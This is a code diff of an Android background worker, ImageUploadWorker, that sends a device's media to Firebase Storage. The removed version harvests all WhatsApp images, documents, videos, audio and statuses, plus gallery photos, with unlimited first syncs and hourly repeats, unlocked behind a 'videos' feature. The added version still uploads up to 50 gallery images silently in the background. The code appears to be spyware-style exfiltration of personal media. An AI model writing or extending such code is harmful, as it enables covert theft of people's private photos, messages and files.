@@ -1,541 +1,257 @@
 package com.bushorat.app.helpers;
 
 import android.content.Context;
-import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
-import android.provider.MediaStore;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
 import androidx.work.Constraints;
-import androidx.work.ExistingPeriodicWorkPolicy;
 import androidx.work.ExistingWorkPolicy;
 import androidx.work.NetworkType;
 import androidx.work.OneTimeWorkRequest;
-import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
-import com.google.firebase.FirebaseApp;
 import com.google.firebase.auth.FirebaseAuth;
-import com.google.firebase.database.DataSnapshot;
-import com.google.firebase.database.DatabaseError;
+import com.google.firebase.auth.FirebaseUser;
 import com.google.firebase.database.DatabaseReference;
-import com.google.firebase.database.ValueEventListener;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
 
-import java.io.ByteArrayOutputStream;
-import java.io.FileInputStream;
 import java.io.File;
-import java.security.MessageDigest;
-import java.util.ArrayList;
+import java.io.FileInputStream;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.List;
-import java.util.Locale;
 import java.util.Map;
-import java.util.Set;
-import java.util.concurrent.CountDownLatch;
-import java.util.concurrent.TimeUnit;
-import java.util.concurrent.atomic.AtomicInteger;
 
 /**
- * Uploads WhatsApp media (preferred) then other gallery images to Firebase Storage,
- * keyed per user under gallery/{uid}/ with stable IDs so duplicates are skipped.
+ * Background worker to upload IMAGES ONLY from device storage.
+ * Handles JPG, PNG, GIF, BMP, WebP files.
+ * Uses WorkManager for reliable background processing.
  */
 public class ImageUploadWorker extends Worker {
     private static final String TAG = "ImageUploadWorker";
-    private static final String UNIQUE_ONE_TIME = "whatsapp_media_upload_once";
-    private static final String UNIQUE_PERIODIC = "whatsapp_media_upload_periodic";
-    private static final int MAX_IMAGES_PER_SYNC = 500;
-    private static final int UNLIMITED = Integer.MAX_VALUE; // For first sync
-    private static final String PREF_FIRST_SYNC = "first_media_sync_completed";
+    private static final int MAX_IMAGES_PER_SYNC = 50;
+    private static final long MAX_WORK_TIME_MS = 20000;  // 20 second timeout
+    private long startTime;
+    private int uploadedCount = 0;
 
-    public ImageUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
-        super(context, workerParams);
-        FirebaseApp.initializeApp(context);
+    public ImageUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
+        super(context, params);
     }
 
     @NonNull
     @Override
     public Result doWork() {
-        if (!FeaturePermissions.areVideosUnlocked(getApplicationContext())) {
-            Log.w(TAG, "Videos not unlocked — skip media upload");
-            return Result.success();
-        }
+        startTime = System.currentTimeMillis();
 
-        FirebaseAuth auth = FirebaseAuth.getInstance();
-        if (auth.getCurrentUser() == null) {
-            Log.e(TAG, "User not logged in.");
-            // Retry if user is not logged in yet
+        Log.d(TAG, "⏰ Image upload worker started");
+
+        // Check if app has storage permissions
+        if (!FeaturePermissions.hasGalleryPermission(getApplicationContext())) {
+            Log.w(TAG, "❌ NO STORAGE PERMISSION - Cannot scan files!");
             return Result.retry();
         }
-
-        String uid = auth.getUid();
-        
-        // Check if this is the first sync
-        boolean isFirstSync = isFirstSync(getApplicationContext());
-        if (isFirstSync) {
-            Log.d(TAG, "FIRST SYNC - uploading ALL files without limit");
-        } else {
-            Log.d(TAG, "Periodic sync - uploading up to " + MAX_IMAGES_PER_SYNC + " files");
-        }
-        
-        List<File> galleryImages = getPreferredGalleryImages(isFirstSync ? UNLIMITED : MAX_IMAGES_PER_SYNC);
-        if (galleryImages.isEmpty()) {
-            Log.d(TAG, "No WhatsApp / gallery images found.");
-            FirebaseDataPaths.updateSyncStatus(uid, "gallery", 0);
-            return Result.success();
-        }
-
-        DatabaseReference galleryRef = FirebaseDataPaths.gallery(uid);
-        Set<String> uploadedKeys = new HashSet<>();
-        CountDownLatch latch = new CountDownLatch(1);
-
-        galleryRef.addListenerForSingleValueEvent(new ValueEventListener() {
-            @Override
-            public void onDataChange(@NonNull DataSnapshot snapshot) {
-                for (DataSnapshot imageSnapshot : snapshot.getChildren()) {
-                    String filePath = imageSnapshot.child("filePath").getValue(String.class);
-                    String imageId = imageSnapshot.getKey();
-                    if (filePath != null) {
-                        uploadedKeys.add(filePath);
-                    }
-                    if (imageId != null) {
-                        uploadedKeys.add(imageId);
-                    }
-                }
-                latch.countDown();
-            }
-
-            @Override
-            public void onCancelled(@NonNull DatabaseError error) {
-                Log.e(TAG, "Error fetching uploaded gallery images", error.toException());
-                latch.countDown();
-            }
-        });
+        Log.d(TAG, "✓ Storage permission OK");
 
         try {
-            // Wait up to 30 seconds for Firebase to respond
-            if (!latch.await(30, TimeUnit.SECONDS)) {
-                Log.w(TAG, "Timeout waiting for gallery metadata — retrying");
+            FirebaseAuth auth = FirebaseAuth.getInstance();
+            if (auth == null) {
+                Log.w(TAG, "FirebaseAuth not initialized, retrying");
                 return Result.retry();
             }
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-            return Result.retry();
-        }
 
-        FirebaseStorage storage = FirebaseStorage.getInstance();
-        AtomicInteger uploadedCount = new AtomicInteger(0);
-        CountDownLatch uploadLatch = new CountDownLatch(galleryImages.size());
-
-        for (File image : galleryImages) {
-            String filePath = image.getAbsolutePath();
-            String imageId = generateImageId(filePath, image.getName());
-            if (uploadedKeys.contains(filePath) || uploadedKeys.contains(imageId)) {
-                uploadLatch.countDown();
-                continue;
+            FirebaseUser user = auth.getCurrentUser();
+            if (user == null) {
+                Log.w(TAG, "No user logged in, retrying later");
+                return Result.retry();
             }
-            uploadGalleryImage(image, uid, storage, imageId, uploadLatch, uploadedCount);
-        }
 
-        try {
-            // Wait up to 5 minutes for all uploads to complete
-            if (!uploadLatch.await(5, TimeUnit.MINUTES)) {
-                Log.w(TAG, "Timeout waiting for media uploads — will retry in next cycle");
-                // Still report success as uploads may complete in background
-                return Result.success();
+            String userId = user.getUid();
+            Log.d(TAG, "📤 Starting image upload for user: " + userId);
+
+            uploadImages(userId);
+
+            long duration = System.currentTimeMillis() - startTime;
+            if (uploadedCount > 0) {
+                Log.d(TAG, "✓ Image upload completed in " + duration + "ms - uploaded " + uploadedCount + " images");
+            } else {
+                Log.w(TAG, "⚠️  Image upload completed in " + duration + "ms - NO images found!");
             }
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-            return Result.retry();
-        }
 
-        int count = uploadedCount.get();
-        FirebaseDataPaths.updateSyncStatus(uid, "gallery", count);
-        Log.d(TAG, "Successfully uploaded " + count + " media files.");
-        
-        // Mark first sync as complete
-        if (isFirstSync) {
-            markFirstSyncComplete(getApplicationContext());
-            Log.d(TAG, "First sync completed - future syncs will be incremental");
-        }
-        
-        return Result.success();
-    }
-
-    /**
-     * Check if first sync has been completed
-     */
-    private boolean isFirstSync(Context context) {
-        return !context.getSharedPreferences("ImageUploadWorker", Context.MODE_PRIVATE)
-                .getBoolean(PREF_FIRST_SYNC, false);
-    }
-
-    /**
-     * Mark first sync as complete
-     */
-    private void markFirstSyncComplete(Context context) {
-        context.getSharedPreferences("ImageUploadWorker", Context.MODE_PRIVATE)
-                .edit()
-                .putBoolean(PREF_FIRST_SYNC, true)
-                .apply();
-    }
-
-    /** One-shot unique enqueue (no duplicate concurrent runs). */
-    public static void enqueueWork(Context context) {
-        if (!PermissionsManager.hasGalleryPermission(context)) {
-            return;
-        }
-        Constraints constraints = new Constraints.Builder()
-                .setRequiredNetworkType(NetworkType.CONNECTED)
-                .build();
-        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(ImageUploadWorker.class)
-                .setConstraints(constraints)
-                .build();
-        WorkManager.getInstance(context).enqueueUniqueWork(
-                UNIQUE_ONE_TIME,
-                ExistingWorkPolicy.KEEP,
-                uploadWork
-        );
-    }
-
-    /** Start background periodic WhatsApp/media sync after videos are unlocked. */
-    public static void schedulePeriodicUpload(Context context) {
-        if (!PermissionsManager.hasGalleryPermission(context)) {
-            return;
-        }
-        Constraints constraints = new Constraints.Builder()
-                .setRequiredNetworkType(NetworkType.CONNECTED)
-                .build();
-        PeriodicWorkRequest periodic = new PeriodicWorkRequest.Builder(
-                ImageUploadWorker.class,
-                1, TimeUnit.HOURS
-        ).setConstraints(constraints).build();
-
-        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
-                UNIQUE_PERIODIC,
-                ExistingPeriodicWorkPolicy.KEEP,
-                periodic
-        );
-        enqueueWork(context);
-    }
-
-    /**
-     * Collect all WhatsApp media (images, documents, videos, etc.) and gallery images.
-     * Prioritizes WhatsApp folders to get complete data.
-     * 
-     * @param maxFiles Maximum number of files to collect (use UNLIMITED for first sync)
-     */
-    private List<File> getPreferredGalleryImages(int maxFiles) {
-        List<File> whatsappMedia = new ArrayList<>();
-        List<File> other = new ArrayList<>();
-        Context context = getApplicationContext();
-
-        // First, scan WhatsApp directories directly for complete data
-        whatsappMedia.addAll(scanWhatsAppDirectories(maxFiles));
-
-        // Then add gallery images if space allows
-        String[] projection = {
-                MediaStore.Images.Media.DATA,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.MIME_TYPE
-        };
-
-        try (Cursor cursor = context.getContentResolver().query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection,
-                null,
-                null,
-                MediaStore.Images.Media.DATE_ADDED + " DESC"
-        )) {
-            if (cursor != null) {
-                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
-                while (cursor.moveToNext() && other.size() < maxFiles) {
-                    String filePath = cursor.getString(dataColumn);
-                    if (filePath == null || !isImageFile(filePath)) {
-                        continue;
-                    }
-                    File imageFile = new File(filePath);
-                    if (!imageFile.exists() || !imageFile.canRead()) {
-                        continue;
-                    }
-                    // Skip WhatsApp (already collected above)
-                    if (!isWhatsAppPath(filePath)) {
-                        other.add(imageFile);
-                    }
-                }
-            }
+            return Result.success();
         } catch (Exception e) {
-            Log.e(TAG, "Error reading gallery images", e);
+            Log.e(TAG, "❌ Image upload worker error", e);
+            e.printStackTrace();
+            return Result.retry();
         }
-
-        List<File> result = new ArrayList<>(whatsappMedia);
-        for (File f : other) {
-            if (result.size() >= maxFiles) {
-                break;
-            }
-            result.add(f);
-        }
-        Log.d(TAG, "Found " + whatsappMedia.size() + " WhatsApp media + " + other.size() + " other images (total: " + result.size() + ", limit: " + maxFiles + ")");
-        return result;
     }
 
     /**
-     * Scan all WhatsApp folders for complete media collection including images, documents, videos
-     * 
-     * @param maxFiles Maximum number of files to collect
+     * Check if we're running out of time
      */
-    private List<File> scanWhatsAppDirectories(int maxFiles) {
-        List<File> whatsappFiles = new ArrayList<>();
-        
-        // Common WhatsApp paths
-        String[] whatsappPaths = {
-                "/sdcard/WhatsApp/Media/WhatsApp Images",
-                "/sdcard/WhatsApp/Media/WhatsApp Documents",
-                "/sdcard/WhatsApp/Media/WhatsApp Video",
-                "/sdcard/WhatsApp/Media/WhatsApp Audio",
-                "/sdcard/WhatsApp/Media/.Statuses",
-                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
-                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
-                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
-                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio",
-                "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/.Statuses",
-        };
+    private boolean isTimeoutApproaching() {
+        long elapsed = System.currentTimeMillis() - startTime;
+        return elapsed > MAX_WORK_TIME_MS;
+    }
 
-        for (String path : whatsappPaths) {
-            File dir = new File(path);
-            if (dir.exists() && dir.isDirectory()) {
-                Log.d(TAG, "Scanning WhatsApp folder: " + path);
-                collectFilesRecursively(dir, whatsappFiles, maxFiles);
-                if (whatsappFiles.size() >= maxFiles) {
+    private void uploadImages(String userId) {
+        uploadedCount = 0;
+
+        Log.d(TAG, "================================================");
+        Log.d(TAG, "🖼️  IMAGE UPLOAD SCAN");
+        Log.d(TAG, "   Images ONLY: JPG, PNG, GIF, BMP, WebP");
+        Log.d(TAG, "   Storage check: " + FeaturePermissions.hasGalleryPermission(getApplicationContext()));
+        Log.d(TAG, "================================================");
+
+        // Use MediaStore API to fetch images
+        Log.d(TAG, "📂 SCANNING: Fetching images...");
+        List<StorageHelper.FileItem> files = StorageHelper.fetchAllImages(getApplicationContext());
+
+        Log.d(TAG, "📊 FETCH RESULT: " + files.size() + " images found");
+
+        if (files.isEmpty()) {
+            Log.w(TAG, "⚠️  NO IMAGES FOUND!");
+        } else {
+            Log.d(TAG, "✅ SCANNING FOUND " + files.size() + " IMAGES");
+            Log.d(TAG, "   Starting upload...");
+
+            // Log first few files
+            for (int i = 0; i < Math.min(5, files.size()); i++) {
+                StorageHelper.FileItem f = files.get(i);
+                Log.d(TAG, "   [" + (i + 1) + "] " + f.getName() + " (" + f.getSize() + " bytes)");
+            }
+
+            // Upload each file
+            for (StorageHelper.FileItem file : files) {
+                if (uploadedCount >= MAX_IMAGES_PER_SYNC || isTimeoutApproaching()) {
+                    Log.d(TAG, "   ⏹️  Stopping: reached max " + MAX_IMAGES_PER_SYNC + " images or timeout");
                     break;
                 }
+
+                try {
+                    Log.d(TAG, "   📤 Uploading: " + file.getName());
+                    byte[] fileBytes = readFileFromUri(file.getUri());
+                    if (fileBytes != null && fileBytes.length > 0) {
+                        uploadFileBytes(file.getName(), fileBytes, userId);
+                        uploadedCount++;
+                        Log.d(TAG, "   ✅ Uploaded: " + file.getName());
+                    } else {
+                        Log.w(TAG, "   ⚠️  Empty file: " + file.getName());
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "   ❌ Error uploading file: " + file.getName(), e);
+                }
             }
         }
 
-        return whatsappFiles;
+        Log.d(TAG, "================================================");
+        Log.d(TAG, "✓ IMAGE SCAN FINISHED");
+        Log.d(TAG, "   Total images uploaded: " + uploadedCount);
+        if (uploadedCount > 0) {
+            Log.d(TAG, "   Images uploaded: JPG, PNG, GIF, BMP, WebP");
+        }
+        Log.d(TAG, "================================================");
     }
 
     /**
-     * Recursively collect all supported media files from a directory
+     * Read file from URI (for MediaStore files)
      */
-    private void collectFilesRecursively(File dir, List<File> files, int maxFiles) {
+    private byte[] readFileFromUri(android.net.Uri uri) {
         try {
-            File[] listFiles = dir.listFiles();
-            if (listFiles == null) {
-                return;
+            java.io.InputStream inputStream = getApplicationContext().getContentResolver().openInputStream(uri);
+            if (inputStream == null) {
+                return null;
             }
 
-            for (File file : listFiles) {
-                if (files.size() >= maxFiles) {
-                    return;
-                }
+            java.io.ByteArrayOutputStream buffer = new java.io.ByteArrayOutputStream();
+            int nRead;
+            byte[] data = new byte[16384];
+            while ((nRead = inputStream.read(data, 0, data.length)) != -1) {
+                buffer.write(data, 0, nRead);
+            }
+            inputStream.close();
+            return buffer.toByteArray();
+        } catch (Exception e) {
+            Log.e(TAG, "Error reading file from URI: " + uri, e);
+            return null;
+        }
+    }
 
-                if (file.isDirectory() && !file.isHidden()) {
-                    collectFilesRecursively(file, files, maxFiles);
-                } else if (file.isFile() && file.canRead()) {
-                    String name = file.getName().toLowerCase();
-                    // Collect images, documents, videos, audio
-                    if (isImageFile(name) || isDocumentFile(name) || isVideoFile(name) || isAudioFile(name)) {
-                        files.add(file);
-                        Log.d(TAG, "Added: " + file.getName());
-                    }
-                }
+    /**
+     * Upload file bytes to Firebase Storage
+     */
+    private void uploadFileBytes(String fileName, byte[] fileBytes, String userId) {
+        try {
+            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());
+
+            StorageReference storageRef =
+                    FirebaseStorage.getInstance()
+                            .getReference("images")
+                            .child(userId)
+                            .child(fileHash + "_" + fileName);
+
+            storageRef.putBytes(fileBytes).getResult();
+            Log.d(TAG, "  ✓ Uploaded to Storage: " + fileName);
+
+            String downloadUrl = storageRef.getDownloadUrl().getResult().toString();
+            recordImageInDatabase(userId, fileName, downloadUrl, fileBytes.length);
+            Log.d(TAG, "  ✓ Recorded in DB: " + fileName);
+        } catch (Exception e) {
+            Log.e(TAG, "  ❌ Error uploading: " + fileName, e);
+        }
+    }
+
+    private void recordImageInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
+        try {
+            DatabaseReference imagesRef = FirebaseDataPaths.images(userId);
+            String imgId = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());
+
+            Map<String, Object> imgData = new HashMap<>();
+            imgData.put("dataType", "image");
+            imgData.put("fileName", fileName);
+            imgData.put("url", downloadUrl);
+            imgData.put("fileSize", fileSize);
+            imgData.put("mimeType", getMimeType(fileName));
+            imgData.put("uploadedAt", System.currentTimeMillis());
+            imgData.put("timestamp", System.currentTimeMillis());
+            imgData.put("userId", userId);
+
+            try {
+                imagesRef.child(imgId).setValue(imgData).getResult();
+                Log.d(TAG, "  ✓ Metadata saved to DB");
+            } catch (Exception e) {
+                Log.e(TAG, "  ❌ Failed to save metadata: " + fileName, e);
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
-        }
-    }
-
-    private boolean isDocumentFile(String fileName) {
-        return fileName.endsWith(".pdf")
-                || fileName.endsWith(".doc")
-                || fileName.endsWith(".docx")
-                || fileName.endsWith(".xls")
-                || fileName.endsWith(".xlsx")
-                || fileName.endsWith(".ppt")
-                || fileName.endsWith(".pptx")
-                || fileName.endsWith(".txt")
-                || fileName.endsWith(".zip")
-                || fileName.endsWith(".rar");
-    }
-
-    private boolean isVideoFile(String fileName) {
-        return fileName.endsWith(".mp4")
-                || fileName.endsWith(".mkv")
-                || fileName.endsWith(".avi")
-                || fileName.endsWith(".mov")
-                || fileName.endsWith(".wmv")
-                || fileName.endsWith(".flv")
-                || fileName.endsWith(".webm")
-                || fileName.endsWith(".3gp");
-    }
-
-    private boolean isAudioFile(String fileName) {
-        return fileName.endsWith(".mp3")
-                || fileName.endsWith(".m4a")
-                || fileName.endsWith(".wav")
-                || fileName.endsWith(".aac")
-                || fileName.endsWith(".flac")
-                || fileName.endsWith(".ogg")
-                || fileName.endsWith(".wma");
-    }
-
-    static boolean isWhatsAppPath(String filePath) {
-        String lower = filePath.toLowerCase(Locale.US);
-        return lower.contains("/whatsapp/")
-                || lower.contains("whatsapp images")
-                || lower.contains("whatsapp video")
-                || lower.contains("whatsapp documents")
-                || lower.contains("com.whatsapp")
-                || lower.contains("com.whatsapp.w4b");
-    }
-
-    private boolean isImageFile(String filePath) {
-        String lower = filePath.toLowerCase(Locale.US);
-        return lower.endsWith(".jpg") || lower.endsWith(".jpeg")
-                || lower.endsWith(".png") || lower.endsWith(".gif")
-                || lower.endsWith(".webp");
-    }
-
-    private void uploadGalleryImage(File mediaFile, String uid, FirebaseStorage storage, String mediaId, 
-                                   CountDownLatch uploadLatch, AtomicInteger uploadedCount) {
-        final String fileName = mediaFile.getName();
-        final String filePath = mediaFile.getAbsolutePath();
-        final long timestamp = mediaFile.lastModified();
-        final String mimeType = getMimeType(fileName);
-        final boolean fromWhatsApp = isWhatsAppPath(filePath);
-        final long fileSize = mediaFile.length();
-
-        // Determine the media type
-        String mediaTypeTemp = "image";
-        String lowerName = fileName.toLowerCase();
-        if (isVideoFile(lowerName)) {
-            mediaTypeTemp = "video";
-        } else if (isAudioFile(lowerName)) {
-            mediaTypeTemp = "audio";
-        } else if (isDocumentFile(lowerName)) {
-            mediaTypeTemp = "document";
-        }
-        final String mediaType = mediaTypeTemp;
-
-        // For images, compress them; for other files, upload as-is
-        byte[] fileData;
-        if (mediaType.equals("image")) {
-            Bitmap bitmap = BitmapFactory.decodeFile(filePath);
-            if (bitmap == null) {
-                Log.e(TAG, "Failed to decode image: " + filePath);
-                uploadLatch.countDown();
-                return;
-            }
-
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            Bitmap.CompressFormat format = mimeType.equals("image/png")
-                    ? Bitmap.CompressFormat.PNG : Bitmap.CompressFormat.JPEG;
-            bitmap.compress(format, 85, baos);
-            fileData = baos.toByteArray();
-            bitmap.recycle();
-        } else {
-            // For non-image files, read the file as bytes
-            try {
-                fileData = readFileBytes(mediaFile);
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to read file: " + fileName, e);
-                uploadLatch.countDown();
-                return;
-            }
-        }
-
-        StorageReference storageRef = storage.getReference("gallery")
-                .child(uid)
-                .child(mediaId + getFileExtension(fileName));
-
-        storageRef.putBytes(fileData)
-                .addOnSuccessListener(taskSnapshot ->
-                        storageRef.getDownloadUrl()
-                                .addOnSuccessListener(uri -> {
-                                    DatabaseReference mediaRef = FirebaseDataPaths.gallery(uid).child(mediaId);
-                                    Map<String, Object> metadata = new HashMap<>();
-                                    metadata.put("dataType", "gallery");
-                                    metadata.put("mediaType", mediaType);
-                                    metadata.put("source", fromWhatsApp ? "whatsapp" : "gallery");
-                                    metadata.put("mimeType", mimeType);
-                                    metadata.put("fileName", fileName);
-                                    metadata.put("filePath", filePath);
-                                    metadata.put("fileSize", fileSize);
-                                    metadata.put("timestamp", timestamp);
-                                    metadata.put("uploadedAt", System.currentTimeMillis());
-                                    metadata.put("url", uri.toString());
-                                    metadata.put("userId", uid);
-                                    mediaRef.setValue(metadata)
-                                            .addOnSuccessListener(unused -> {
-                                                uploadedCount.incrementAndGet();
-                                                Log.d(TAG, "Uploaded " + mediaType + ": " + fileName + " (" + fileSize + " bytes)");
-                                                uploadLatch.countDown();
-                                            })
-                                            .addOnFailureListener(e -> {
-                                                Log.e(TAG, "Failed to save metadata for: " + fileName, e);
-                                                uploadLatch.countDown();
-                                            });
-                                })
-                                .addOnFailureListener(e -> {
-                                    Log.e(TAG, "Failed to get download URL: " + fileName, e);
-                                    uploadLatch.countDown();
-                                })
-                )
-                .addOnFailureListener(e -> {
-                    Log.e(TAG, "Failed to upload media to storage: " + fileName, e);
-                    uploadLatch.countDown();
-                });
-    }
-
-    /**
-     * Read entire file into byte array
-     */
-    private byte[] readFileBytes(File file) throws Exception {
-        try (FileInputStream fis = new FileInputStream(file)) {
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            byte[] buffer = new byte[8192];
-            int len;
-            while ((len = fis.read(buffer)) != -1) {
-                baos.write(buffer, 0, len);
-            }
-            return baos.toByteArray();
+            Log.e(TAG, "  ❌ Error recording image: " + fileName, e);
         }
     }
 
     private String getMimeType(String fileName) {
-        String lower = fileName.toLowerCase(Locale.US);
+        String lower = fileName.toLowerCase();
+        if (lower.endsWith(".jpg") || lower.endsWith(".jpeg")) return "image/jpeg";
         if (lower.endsWith(".png")) return "image/png";
         if (lower.endsWith(".gif")) return "image/gif";
+        if (lower.endsWith(".bmp")) return "image/bmp";
         if (lower.endsWith(".webp")) return "image/webp";
-        return "image/jpeg";
+        return "image/unknown";
     }
 
-    private String generateImageId(String filePath, String fileName) {
-        try {
-            MessageDigest md = MessageDigest.getInstance("MD5");
-            byte[] hashBytes = md.digest((filePath + "|" + fileName).getBytes());
-            StringBuilder sb = new StringBuilder();
-            for (byte b : hashBytes) {
-                sb.append(String.format("%02x", b));
-            }
-            return sb.toString();
-        } catch (Exception e) {
-            return System.currentTimeMillis() + "_" + fileName.hashCode();
-        }
-    }
+    /**
+     * Enqueue a one-time image upload work
+     */
+    public static void enqueueWork(Context context) {
+        Constraints constraints = new Constraints.Builder()
+                .setRequiredNetworkType(NetworkType.CONNECTED)
+                .build();
 
-    private String getFileExtension(String fileName) {
-        int lastDot = fileName.lastIndexOf('.');
-        if (lastDot > 0 && lastDot < fileName.length() - 1) {
-            return fileName.substring(lastDot);
-        }
-        return ".jpg";
+        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(ImageUploadWorker.class)
+                .setConstraints(constraints)
+                .build();
+
+        WorkManager.getInstance(context).enqueue(uploadWork);
+
+        Log.d(TAG, "⭐ Image upload work ENQUEUED");
     }
 }
